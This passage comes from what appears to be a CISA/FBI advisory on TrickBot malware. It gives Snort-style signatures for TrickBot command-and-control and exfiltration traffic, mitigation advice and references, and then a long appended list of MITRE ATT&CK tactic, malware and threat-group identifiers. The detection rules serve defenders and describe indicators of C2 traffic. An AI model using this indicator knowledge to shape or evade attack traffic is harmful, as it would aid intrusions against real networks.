"; sid:1; rev:1; flow:established,to_server; content:"User-Agent|3a 20|WinHTTP loader/1."; http_header; fast_pattern:only; content:".png|20|HTTP/1."; pcre:"/^Host\x3a\x20(?:\d{1,3}\.){3}\d{1,3}(?:\x3a\d{2,5})?$/mH"; content:!"Accept"; http_header; content:!"Referer|3a 20|"; http_header; classtype:bad-unknown; metadata:service http;) alert tcp any $HTTP_PORTS -> any any (msg:"TRICKBOT:HTTP Server Header contains 'Server|3a 20|Cowboy'"; sid:1; rev:1; flow:established,from_server; content:"200"; http_stat_code; content:"Server|3a 20|Cowboy|0d 0a|"; http_header; fast_pattern; content:"content-length|3a 20|3|0d 0a|"; http_header; file_data; content:"/1/"; depth:3; isdataat:!1,relative; classtype:bad-unknown; metadata:service http;) alert tcp any any -> any $HTTP_PORTS (msg:"TRICKBOT:HTTP URI POST contains C2 Exfil"; sid:1; rev:1; flow:established,to_server; content:"Content-Type|3a 20|multipart/form-data|3b 20|boundary=------Boundary"; http_header; fast_pattern; content:"User-Agent|3a 20|"; http_header; distance:0; content:"Content-Length|3a 20|"; http_header; distance:0; content:"POST"; http_method; pcre:"/^\/[a-z]{3}\d{3}\/.+?\.[A-F0-9]{32}\/\d{1,3}\//U"; pcre:"/^Host\x3a\x20(?:\d{1,3}\.){3}\d{1,3}$/mH"; content:!"Referer|3a|"; http_header; classtype:bad-unknown; metadata:service http;) alert tcp any any -> any $HTTP_PORTS (msg:"HTTP URI GET/POST contains '/56evcxv' (Trickbot)"; sid:1; rev:1; flow:established,to_server; content:"/56evcxv"; http_uri; fast_pattern:only; classtype:bad-unknown; metadata:service http;) alert icmp any any -> any any (msg:"TRICKBOT_ICMP_ANCHOR:ICMP traffic conatins 'hanc'"; sid:1; rev:1; itype:8; content:"hanc"; offset:4; fast_pattern; classtype:bad-unknown;) alert tcp any any -> any $HTTP_PORTS (msg:"HTTP Client Header contains POST with 'host|3a 20|*.onion.link' and 'data=' (Trickbot/Princess Ransomeware)"; sid:1; rev:1; flow:established,to_server; content:"POST"; nocase; http_method; content:"host|3a 20|"; http_header; content:".onion.link"; nocase; http_header; distance:0; within:47; fast_pattern; file_data; content:"data="; distance:0; within:5; classtype:bad-unknown; metadata:service http;) alert tcp any any -> any $HTTP_PORTS (msg:"HTTP Client Header contains 'host|3a 20|tpsci.com' (trickbot)"; sid:1; rev:1; flow:established,to_server; content:"host|3a 20|tpsci.com"; http_header; fast_pattern:only; classtype:bad-unknown; metadata:service http;) MitigationsCISA and FBI recommend that network defenders—in federal, state, local, tribal, territorial governments, and the private sector—consider applying the following best practices to strengthen the security posture of their organization's systems.
System owners and administrators should review any configuration changes prior to implementation to avoid negative impacts. 
Provide social engineering and phishing training to employees. 
Consider drafting or updating a policy addressing suspicious emails that specifies users must report all suspicious emails to the security and/or IT departments. 
Mark external emails with a banner denoting the email is from an external source to assist users in detecting spoofed emails. 
Implement Group Policy Object and firewall rules. 
Implement an antivirus program and a formalized patch management process. 
Implement filters at the email gateway and block suspicious IP addresses at the firewall. 
Adhere to the principle of least privilege. 
Implement a Domain-Based Message Authentication, Reporting & Conformance validation system. 
Segment and segregate networks and functions. 
Limit unnecessary lateral communications between network hoses, segments, and devices. Consider using application allowlisting technology on all assets to ensure that only authorized software executes, and all unauthorized software is blocked from executing on assets.
Ensure that such technology only allows authorized, digitally signed scripts to run on a system. 
Enforce multi-factor authentication. 
Enable a firewall on agency workstations configured to deny unsolicited connection requests. 
Disable unnecessary services on agency workstations and servers. 
Implement an Intrusion Detection System, if not already used, to detect C2 activity and other potentially malicious network activity Monitor web traffic.
Restrict user access to suspicious or risky sites. 
Maintain situational awareness of the latest threats and implement appropriate access control lists. 
Disable the use of SMBv1 across the network and require at least SMBv2 to harden systems against network propagation modules used by TrickBot. 
Visit the MITRE ATT&CK Techniques pages (linked in table 1 above) for additional mitigation and detection strategies. 
See CISA’s Alert on Technical Approaches to Uncovering and Remediating Malicious Activity for more information on addressing potential incidents and applying best practice incident response procedures. 
For additional information on malware incident prevention and handling, see the National Institute of Standards and Technology Special Publication 800-83, Guide to Malware Incident Prevention and Handling for Desktops and Laptops. 
Resources CISA Fact Sheet: TrickBot Malware MS-ISAC White Paper: Security Primer – TrickBot United Kingdom National Cyber Security Centre Advisory: Ryuk Ransomware Targeting Organisations Globally CISA and MS-ISAC Joint Alert AA20-280A: Emotet Malware MITRE ATT&CK for Enterprise References [1] FireEye Blog - A Nasty Trick: From Credential Theft Malware to Business Disruption
[2] Eclypsium Blog - TrickBot Now Offers 'TrickBoot': Persist, Brick, Profit Revisions March 17, 2021:
Initial Version March 24, 2021:
Added MITRE ATT&CK Technique T1592.003 used for reconnaissance May 20, 2021:
Added new MITRE ATT&CKs and updated Table 1 
This product is provided subject to this Notification and this Privacy & Use policy. 
Lateral Movement
Defense Evasion
Execution
Discovery
Credential Access
Collection
Persistence
Command and Control
Initial Access
Exfiltration
Privilege Escalation
TA0008
TA0005
TA0002
TA0007
TA0006
TA0009
TA0003
TA0011
TA0001
TA0010
TA0004
S0143 Flame
S0366 WannaCry
G0102 Wizard Spider
G0117 Fox Kitten
G1006 Earth Lusca
S0603 Stuxnet
S0650 QakBot
S0367 Emotet
S0363 Empire
S0606 Bad Rabbit
S0368 NotPetya
S0260 InvisiMole
G0007 APT28
S0608 Conficker
S0378 PoshC2
S0532 Lucifer
G0131 Tonto Team
G0045 menuPass
S0266 TrickBot
G0035 Dragonfly
G0069 MuddyWater
G0027 Threat Group-3390
G0046 FIN7
S1068 BlackCat
G0050 APT32
G1007 Aoqin Dragon
S0457 Netwalker
S0190 BITSAdmin
G0051 FIN10
S0095 ftp
S0404 esentutl
G1017 Volt Typhoon
G0010 Turla
C0018 C0018
C0025 2016 Ukraine Electric Power Attack
S0361 Expand
G0114 Chimera
S0365 Olympic Destroyer
C0014 Operation Wocao
C0034 2022 Ukraine Electric Power Attack
G0093 GALLIUM
S0140 Shamoon
G0059 Magic Hound
S0029 PsExec
S0698 HermeticWizard
S0062 DustySky
G0034 Sandworm Team
C0028 2015 Ukraine Electric Power Attack
S0372 LockerGoga
C0015 C0015
G0096 APT41
S0106 cmd
G0116 Operation Wocao
S0585 Kerrdown
S0230 ZeroT
S0584 AppleJeus
S1028 Action RAT
G0060 BRONZE BUTLER
S0669 KOCTOPUS
S1086 Snip3
S0574 BendyBear
S0513 LiteDuke
S0598 P.A.S. Webshell
S0356 KONNI
S0409 Machete
S0415 BOOSTWRITE
G0087 APT39
S1078 RotaJakiro
S0284 More_eggs
S1066 DarkTortilla
S0666 Gelsemium
S0226 Smoke Loader
S1122 Mispadu
S0611 Clop
S0461 SDBbot
S0638 Babuk
S0127 BBSRAT
S0663 SysUpdate
S0447 Lokibot
S0223 POWERSTATS
S0269 QUADAGENT
G0090 WIRTE
S0636 VaporRage
G0078 Gorgon Group
G0094 Kimsuky
S0640 Avaddon
S0615 SombRAT
S1026 Mongall
S1115 WIREFIRE
S0661 FoggyWeb
S0434 Imminent Monitor
C0005 Operation Spalax
S1113 RAPIDPULSE
S0456 Aria-body
S0596 ShadowPad
S1076 QUIETCANARY
S0188 Starloader
S0436 TSCookie
S0575 Conti
S0236 Kwampirs
S0629 RainyDay
S0255 DDKONG
S0354 Denis
S1039 Bumblebee
S0355 Final1stspy
G0004 Ke3chang
S0635 BoomBox
S1041 Chinoxy
S0344 Azorult
S0373 Astaroth
S1030 Squirrelwaffle
S0622 AppleSeed
S0469 ABK
S0264 OopsIE
S1051 KEYPLUG
S1119 LIGHTWIRE
S0430 Winnti for Linux
S0674 CharmPower
S0377 Ebury
S1060 Mafalda
G0021 Molerats
S0268 Bisonal
C0017 C0017
G0012 Darkhotel
S0352 OSX_OCEANLOTUS.D
S1032 PyDCrypt
S0448 Rising Sun
S0115 Crimson
S0678 Torisma
S1027 Heyoka Backdoor
S0667 Chrommme
S0239 Bankshot
S0257 VERMIN
S0395 LightNeuron
S0487 Kessel
S1117 GLASSTOKEN
S0189 ISMInjector
S1085 Sardonic
G0128 ZIRCONIUM
S0160 certutil
S1059 metaMain
S0011 Taidoor
S1110 SLIGHTPULSE
S0495 RDAT
S0554 Egregor
G0049 OilRig
S0634 EnvyScout
S0482 Bundlore
S0398 HyperBro
S0024 Dyre
S0579 Waterbear
S0386 Ursnif
S0401 Exaramel for Linux
S0473 Avenger
C0024 SolarWinds Compromise
S1053 AvosLocker
S0388 YAHOYAH
S1022 IceApple
S0470 BBK
S0263 TYPEFRAME
S1100 Ninja
S0147 Pteranodon
S1047 Mori
S0670 WarzoneRAT
S1063 Brute Ratel C4
S0690 Green Lambert
S0279 Proton
S0641 Kobalos
S0414 BabyShark
S0335 Carbon
S0697 HermeticWiper
S0375 Remexi
S0032 gh0st RAT
G0047 Gamaredon Group
S1065 Woody RAT
S0402 OSX/Shlayer
S1050 PcShare
G0092 TA505
S0492 CookieMiner
S0547 DropBook
S0511 RegDuke
S1097 HUI Loader
S0468 Skidmap
S0240 ROKRAT
S0623 Siloscape
S0443 MESSAGETAP
S0444 ShimRat
S0502 Drovorub
S0588 GoldMax
S0576 MegaCortex
G0139 TeamTNT
S0681 Lizar
S0647 Turian
S0610 SideTwist
S0496 REvil
S0331 Agent Tesla
S1016 MacMa
S1052 DEADEYE
S0515 WellMail
C0021 C0021
S0369 CoinTicker
S0673 DarkWatchman
S0546 SharpStage
S1111 DarkGate
S0589 Sibot
S0637 NativeZone
S0517 Pillowmint
G0032 Lazarus Group
S0601 Hildegard
S0126 ComRAT
S0531 Grandoreiro
S0660 Clambling
S0618 FIVEHANDS
S1018 Saint Bot
S0154 Cobalt Strike
S1019 Shark
S0581 IronNetInjector
S0543 Spark
S0439 Okrum
S0466 WindTail
S0394 HiddenWasp
S0665 ThreatNeedle
S0390 SQLRat
S0562 SUNSPOT
S0476 Valak
G0065 Leviathan
S0560 TEARDROP
S0196 PUNCHBUGGY
S0353 NOKKI
G1021 Cinnamon Tempest
S0613 PS1
S0348 Cardinal RAT
S0689 WhisperGate
G0106 Rocke
S0632 GrimAgent
S1046 PowGoop
S0514 WellMess
S0628 FYAnti
S0477 Goopy
S0612 WastedLocker
S0013 PlugX
S1105 COATHANGER
S1014 DanBot
S1031 PingPull
S0642 BADFLICK
S0022 Uroburos
S0501 PipeMon
S0258 RGDoor
S0182 FinFisher
G0081 Tropic Trooper
G1016 FIN13
S1025 Amadey
S1112 STEADYPULSE
C0001 Frankenstein
S0347 AuditCred
S0141 Winnti for Windows
S0534 Bazar
S0428 PoetRAT
S1012 PowerLess
S0052 OnionDuke
C0016 Operation Dust Storm
S0251 Zebrocy
G1026 Malteiro
S0330 Zeus Panda
S1123 PITSTOP
S0475 BackConfig
S0687 Cyclops Blink
S0520 BLINDINGCAN
S1120 FRAMESTING
S0631 Chaes
S0234 Bandook
S0516 SoreFang
S0458 Ramsay
S0280 MirageFox
S0653 xCaon
S0455 Metamorfo
S1118 BUSHWALK
S0526 KGH_SPY
S0614 CostaBricks
S0270 RogueRobin
S0604 Industroyer
S1013 ZxxZ
C0006 Operation Honeybee
G0073 APT19
S0624 Ecipekac
G0126 Higaisa
S0512 FatDuke
S0180 Volgmer
S0582 LookBack
S0518 PolyglotDuke
S0565 Raindrop
S0567 Dtrack
S0499 Hancitor
G0118 UNC2452
G0016 APT29
G0101 Frankenstein
G0072 Honeybee
S0053 SeaDuke
S0259 InnaputRAT
S0187 Daserf
S0046 CozyCar
S1017 OutSteel
S0229 Orz
S0381 FlawedAmmyy
S0651 BoxCaon
S0124 Pisloader
S0346 OceanSalt
S0639 Seth-Locker
S0504 Anchor
S0025 CALENDAR
S0336 NanoCore
G0039 Suckfly
S0345 Seasalt
S0020 China Chopper
G0070 Dark Caracal
S1034 StrifeWater
S0148 RTM
S0201 JPIN
S0382 ServHelper
S1035 Small Sieve
S0564 BlackMould
S0435 PLEAD
S0244 Comnie
S0271 KEYMARBLE
G0028 Threat Group-1314
S0283 jRAT
S0082 Emissary
S0594 Out1
S0221 Umbreon
S1043 ccf32
S0275 UPPERCUT
S0088 Kasidet
S0360 BONDUPDATER
S0462 CARROTBAT
S0117 XTunnel
S0241 RATANKBA
S0370 SamSam
G0133 Nomadic Octopus
S0070 HTTPBrowser
G0095 Machete
S0481 Ragnar Locker
C0002 Night Dragon
G0082 APT38
S0071 hcdLoader
S0333 UBoatRAT
S0553 MoleNet
S1011 Tarrask
S0031 BACKSPACE
G0125 HAFNIUM
S0453 Pony
S1029 AuTo Stealer
S0084 Mis-Type
S0069 BLACKCOFFEE
G0022 APT3
S0339 Micropsia
S0065 4H RAT
S0464 SYSCON
S0533 SLOTHFULMEDIA
S0253 RunningRAT
S0132 H1N1
S0500 MCMD
S0652 MarkiRAT
S0643 Peppy
S0625 Cuba
G0037 FIN6
S0338 Cobian RAT
S0030 Carbanak
G0108 Blue Mockingbird
S0446 Ryuk
S0668 TinyTurla
S0233 MURKYTOP
S0085 S-Type
S0206 Wiarp
G1013 Metador
S0572 Caterpillar WebShell
S0696 Flagpro
S1129 Akira
S0009 Hikit
S0149 MoonWind
G0129 Mustang Panda
S0200 Dipsind
S0593 ECCENTRICBANDWAGON
S0376 HOPLIGHT
S0045 ADVSTORESHELL
S0185 SEASHARPEE
S0199 TURNEDUP
S0211 Linfo
S1021 DnsSystem
S0493 GoldenSpy
S0459 MechaFlounder
S0034 NETEAGLE
S1070 Black Basta
S0246 HARDRAIN
S0250 Koadic
S0586 TAINTEDSCRIBE
C0007 FunnyDream
G0119 Indrik Spider
G0143 Aquatic Panda
S0396 EvilBunny
S0044 JHUHUGIT
S0452 USBferry
S0332 Remcos
S0153 RedLeaves
S1015 Milan
S0334 DarkComet
S0012 PoisonIvy
S0086 ZLib
S0431 HotCroissant
S0342 GreyEnergy
G0054 Sowbug
G0080 Cobalt Group
S0247 NavRAT
G1022 ToddyCat
S0128 BADNEWS
S0412 ZxShell
S1020 Kevin
S0074 Sakula
S0243 DealersChoice
S1049 SUGARUSH
S0449 Maze
S0184 POWRUNER
S0087 Hi-Zor
S0170 Helminth
S0198 NETWIRE
S0068 httpclient
S0379 Revenge RAT
S0262 QuasarRAT
S0389 JCry
C0012 Operation CuckooBees
S0391 HAWKBALL
S0109 WEBC2
S0083 Misdat
S0237 GravityRAT
S0343 Exaramel for Windows
S0146 TEXTMATE
G0140 LazyScripter
S0249 Gold Dragon
G1023 APT5
S0630 Nebulae
S0256 Mosquito
G0040 Patchwork
S0688 Meteor
S1081 BADHATCH
G0067 APT37
S0164 TDTESS
S0692 SILENTTRINITY
S1037 STARWHALE
G1003 Ember Bear
S0202 adbupd
S1099 Samurai
S0350 zwShell
S0094 Trojan.Karagany
S0238 Proxysvc
G0061 FIN8
S1089 SharpDisco
S0159 SNUGRIDE
C0022 Operation Dream Job
S0451 LoudMiner
G0026 APT18
S0139 PowerDuke
S0387 KeyBoy
G0127 TA551
S0400 RobbinHood
S0267 FELIXROOT
G0075 Rancor
G0006 APT1
S0254 PLAINTEE
S1044 FunnyDream
S0015 Ixeshe
S0158 PHOREAL
S0186 DownPaper
G0091 Silence
S0156 KOMPROGO
S0017 BISCUIT
S0080 Mivast
S0142 StreamEx
S0385 njRAT
S0662 RCSession
S0042 LOWBALL
S0232 HOMEFRY
S0265 Kazuar
S0004 TinyZBot
S0171 Felismus
G0074 Dragonfly 2.0
S0204 Briba
S1064 SVCReady
S0113 Prikormka
S0081 Elise
S0438 Attor
S0093 Backdoor.Oldrea
G0008 Carbanak
S0559 SUNBURST
G0052 CopyKittens
S0568 EVILNUM
S0137 CORESHELL
S0167 Matryoshka
S0091 Epic
G0112 Windshift
S0277 FruitFly
S0351 Cannon
S0059 WinMM
S0219 WINERACK
S1107 NKAbuse
S1114 ZIPLINE
G0121 Sidewinder
G0009 Deep Panda
S0605 EKANS
S0089 BlackEnergy
S0252 Brave Prince
S0410 Fysbis
S0125 Remsec
S0659 Diavol
S0057 Tasklist
S0049 GeminiDuke
S0038 Duqu
S0497 Dacls
S0018 Sykipot
S0441 PowerShower
G0038 Stealth Falcon
S0528 Javali
S0208 Pasam
S0278 iKitten
S0626 P8RAT
S0472 down_new
S0695 Donut
S0248 yty
S0460 Get2
S0151 HALFBAKED
S1075 KOPILUWAK
G0138 Andariel
S0079 MobileOrder
S0607 KillDisk
S0064 ELMER
S0393 PowerStallion
S0664 Pandora
S0467 TajMahal
S1072 Industroyer2
S0162 Komplex
S0657 BLUELIGHT
S0203 Hydraq
S0617 HELLOKITTY
S0694 DRATzarus
S0672 Zox
S0503 FrameworkPOS
S0161 XAgentOSX
S1124 SocGholish
S0194 PowerSploit
S1090 NightClub
S0644 ObliqueRAT
G0033 Poseidon Group
S0595 ThiefQuest
S0063 SHOTPUT
S0627 SodaMaster
G1001 HEXANE
G0100 Inception
S0216 POORAIM
S1087 AsyncRAT
S0242 SynAck
S0491 StrongPity
S0599 Kinsing
S0144 ChChes
G0044 Winnti Group
S0273 Socksbot
S0693 CaddyWiper
S0021 Derusbi
S1073 Royal
S1048 macOS.OSAMiner
S0486 Bonadan
S0445 ShimRatReporter
S0484 Carberp
S0192 Pupy
S0600 Doki
G1008 SideCopy
G1018 TA2541
G0089 The White Company
G0019 Naikon
S0679 Ferocious
S0098 T9000
S0023 CHOPSTICK
S0471 build_downer
S0380 StoneDrill
S0176 Wingbird
S0658 XCSSET
S0337 BadPatch
S0646 SpicyOmelette
S1091 Pacu
S0108 netsh
S0680 LitePower
S0384 Dridex
G0098 BlackTech
S0561 GuLoader
S1033 DCSrv
S0537 HyperStack
C0013 Operation Sharpshooter
S0483 IcedID
S0521 BloodHound
S1058 Prestige
S0569 Explosive
S0416 RDFSNIFFER
S0570 BitPaymer
G0104 Sharpshooter
G0003 Cleaver
G0077 Leafminer
C0029 Cutting Edge
S0349 LaZagne
S0121 Lslsass
G0107 Whitefly
G0064 APT33
S0002 Mimikatz
S0005 Windows Credential Editor
C0030 Triton Safety Instrumented System Attack
G0068 PLATINUM
S0056 Net Crawler
S0583 Pysa
C0032 C0032
G0088 TEMP.Veles
G0086 Stolen Pencil
S0130 Unknown Logger
G0124 Windigo
S0374 SpeakUp
S0433 Rifdoor
S0218 SLOWDRIFT
S0051 MiniDuke
S0217 SHUTTERSPEED
S0649 SMOKEDHAM
G1009 Moses Staff
S0060 Sys10
S0157 SOUNDBITE
S0181 FALLCHILL
S0417 GRIFFON
S0205 Naid
S0155 WINDSHIELD
S0165 OSInfo
S0340 Octopus
S0272 NDiskMonitor
S0048 PinchDuke
G0142 Confucius
S0556 Pay2Key
S0215 KARAE
S0245 BADCALL
S0096 Systeminfo
S0691 Neoichor
S0488 CrackMapExec
S0454 Cadelspy
S0450 SHARPSTATS
G1020 Mustard Tempest
S0587 Penquin
S0616 DEATHRANSOM
S0043 BUBBLEWRAP
G0018 admin@338
S0228 NanHaiShu
S0172 Reaver
S1121 LITTLELAMB.WOOLTEA
S0105 dsquery
S0058 SslMM
S0101 ifconfig
S0590 NBTscan
S0274 Calisto
S0552 AdFind
S1024 CreepySnail
S0633 Sliver
S0102 nbtstat
S0261 Catchamas
S0100 ipconfig
S0103 route
S1106 NGLite
S0099 Arp
S0359 Nltest
S0092 Agent.btz
S0341 Xbash
G0085 FIN4
G1024 Akira
G1004 LAPSUS$
G0001 Axiom
G0011 PittyTiger
G1005 POLONIUM
G0053 FIN5
S0362 Linux Rabbit
G0122 Silent Librarian
G0014 Night Dragon
S0654 ProLock
S0357 Impacket
C0027 C0027
G0135 BackdoorDiplomacy
S0197 PUNCHTRACK
G0084 Gallmaker
G0063 BlackOasis
S0150 POSHSPY
G0099 APT-C-36
S0138 OLDBAIT
S0465 CARROTBALL
S1104 SLOWPULSE
S0609 TRITON
G0031 Dust Storm
S0343 Exaramel
S0152 EvilGrab
G0130 Ajax Security Team
S0033 NetTraveler
S0072 OwaAuth
S0019 Regin
S0213 DOGCALL
S0050 CosmicDuke
S0437 Kivars
G0043 Group5
S0076 FakeM
S0282 MacSpy
S0090 Rover
S0136 USBStealer
S1042 SUGARDUMP
S0055 RARSTONE
S0129 AutoIt backdoor
S1040 Rclone
S0036 FLASHFLOOD
S0235 CrossRAT
S0131 TINYTYPHON
S1102 Pcexter
S1101 LoFiSe
G1015 Scattered Spider
S0066 3PARA RAT
S0686 QuietSieve
S0078 Psylo
S1023 CreepyDrive
G1014 LuminousMoth
S0193 Forfiles
S0498 Cryptoistic
S0212 CORALDECK
S0592 RemoteUtilities
S0035 SPACESHIP
S1125 AcidRain
S1109 PACEMAKER
S1096 Cheerscrypt
S0648 JSS Loader
S0538 Crutch
S0671 Tomiris
S0527 CSPY Downloader
C0004 CostaRicto
S0166 RemoteCMD
S1088 Disco
G1002 BITTER
S0168 Gazer
S0111 schtasks
G0132 CostaRicto
G1012 CURIUM
S0169 RawPOS
S0645 Wevtutil
C0026 C0026
S1074 ANDROMEDA
S0040 HTRAN
G0005 APT12
G0066 Elderwood
G0134 Transparent Tribe
G0048 RTM
G0079 DarkHydrus
G0137 Ferocious Kitten
G0056 PROMETHIUM
G1011 EXOTIC LILY
C0011 C0011
G0062 TA459
G0103 Mofang
G0013 APT30
G0136 IndigoZebra
S1108 PULSECHECK
S0207 Vasport
S0578 SUPERNOVA
G0071 Orangeworm
S0067 pngdowner
S0276 Keydnap
S0371 POWERTON
S0699 Mythic
S0054 CloudDuke
S0037 HAMMERTOSS
G0083 SilverTerrier
S0682 TrailBlazer
S0442 VBShower
S0597 GoldFinder
S0508 ngrok
G1019 MoustachedBouncer
S0508 Ngrok
S0173 FLIPSIDE
S0210 Nerex
S0118 Nidiran
S0530 Melcoz
S0685 PowerPunch
S0134 Downdelph
G0123 Volatile Cedar
G0120 Evilnum
C0010 C0010
S0077 CallMe
S0145 POWERSOURCE
S0107 Cherry Picker
S0195 SDelete
S0061 HDoor
G0024 Putter Panda
G0076 Thrip
G0115 GOLD SOUTHFIELD
G0105 DarkVishnya
S0028 SHIPSHAPE
S0397 LoJax
S0178 Truvasys
S0123 xCmd
S0191 Winexe
S0039 Net
S1084 QUIETEXIT
S0075 Reg
S0677 AADInternals
S0220 Chaos
S0225 sqlmap
S0224 Havij
S0591 ConnectWise
S0163 Janicab
S0010 Lurid
S0116 UACMe
S0041 Wiper
S0174 Responder
